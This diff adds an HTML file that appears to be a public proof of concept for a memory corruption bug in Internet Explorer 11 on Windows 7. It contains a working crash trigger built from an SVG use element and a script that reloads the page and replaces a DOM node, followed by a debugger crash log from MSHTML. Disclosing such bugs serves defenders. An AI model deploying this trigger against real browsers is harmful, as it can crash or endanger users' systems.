@@ -1,0 +1,67 @@
+<!--
+There is a memory corruption issue in IE that can be triggered with svg <use> element.
+
+The bug was confirmed on IE Version 11.0.9600.18617 (Update Version 11.0.40) running on Windows 7 64-bit. I was unable to reproduce it on Windows 10.
+
+PoC:
+
+==========================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<script>
+function go() {
+setTimeout("window.location.reload()",100);
+pattern.replaceChild(use,pattern.childNodes[0]);
+}
+</script>
+<body onload=go()>
+<!--this is a comment-->
+<svg>
+<use id="use" xlink:href="#fecomp">
+<symbol>
+<feComposite id="fecomp" />
+</use>
+<pattern id="pattern">
+<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><output>2)lt</output>
+
+<!--
+==========================================
+
+Following is the crash log when the PoC is ran on 64-bit IE in the single process mode (TabProcGrowth=0).
+
+(1a38.2a98): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+MSHTML!CMarkup::DestroySplayTree+0x10a:
+000007fe`e8de2723 48894110        mov     qword ptr [rcx+10h],rax ds:00000000`700400d6=????????????????
+0:013> r
+rax=0000000012a69010 rbx=0000000012a68c78 rcx=00000000700400c6
+rdx=0000000000000001 rsi=0000000012a68f20 rdi=0000000012a58000
+rip=000007fee8de2723 rsp=0000000012d9bfb0 rbp=0000000012d9c029
+ r8=0000000000000000  r9=0000000012a58000 r10=0000000012a20000
+r11=0000000000000025 r12=0000000012a68f20 r13=0000000012a68f20
+r14=0000000012a20000 r15=0000000012a68bb0
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+MSHTML!CMarkup::DestroySplayTree+0x10a:
+000007fe`e8de2723 48894110        mov     qword ptr [rcx+10h],rax ds:00000000`700400d6=????????????????
+0:013> k
+ # Child-SP          RetAddr           Call Site
+00 00000000`12d9bfb0 000007fe`e8de1ddc MSHTML!CMarkup::DestroySplayTree+0x10a
+01 00000000`12d9c090 000007fe`e8ec9289 MSHTML!CMarkup::UnloadContents+0x49b
+02 00000000`12d9c170 000007fe`e8ec9171 MSHTML!CMarkup::TearDownMarkupHelper+0xd5
+03 00000000`12d9c1a0 000007fe`e90788b2 MSHTML!CMarkup::TearDownMarkup+0x75
+04 00000000`12d9c1f0 000007fe`e998dc7a MSHTML!COmWindowProxy::SwitchMarkup+0x562
+05 00000000`12d9c360 000007fe`e969ce9f MSHTML!COmWindowProxy::ExecRefresh+0xa3a
+06 00000000`12d9c500 000007fe`e8d99d75 MSHTML!GlobalWndOnMethodCall+0x240
+07 00000000`12d9c5a0 00000000`76dd9bbd MSHTML!GlobalWndProc+0x150
+08 00000000`12d9c620 00000000`76dd98c2 USER32!UserCallWinProcCheckWow+0x1ad
+09 00000000`12d9c6e0 000007fe`f2f83395 USER32!DispatchMessageWorker+0x3b5
+0a 00000000`12d9c760 000007fe`f2f7df5b IEFRAME!CTabWindow::_TabWindowThreadProc+0x555
+0b 00000000`12d9f9e0 000007fe`fd09572f IEFRAME!LCIETab_ThreadProc+0x3a3
+0c 00000000`12d9fb10 000007fe`f0b7925f iertutil!Microsoft::WRL::ActivationFactory<Microsoft::WRL::Implements<Microsoft::WRL::FtmBase,Windows::Foundation::IUriRuntimeClassFactory,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil,Microsoft::WRL::Details::Nil>,Windows::Foundation::IUriEscapeStatics,Microsoft::WRL::Details::Nil,0>::GetTrustLevel+0x5f
+0d 00000000`12d9fb40 00000000`76ed59cd IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
+0e 00000000`12d9fb90 00000000`7700a561 kernel32!BaseThreadInitThunk+0xd
+0f 00000000`12d9fbc0 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
+-->
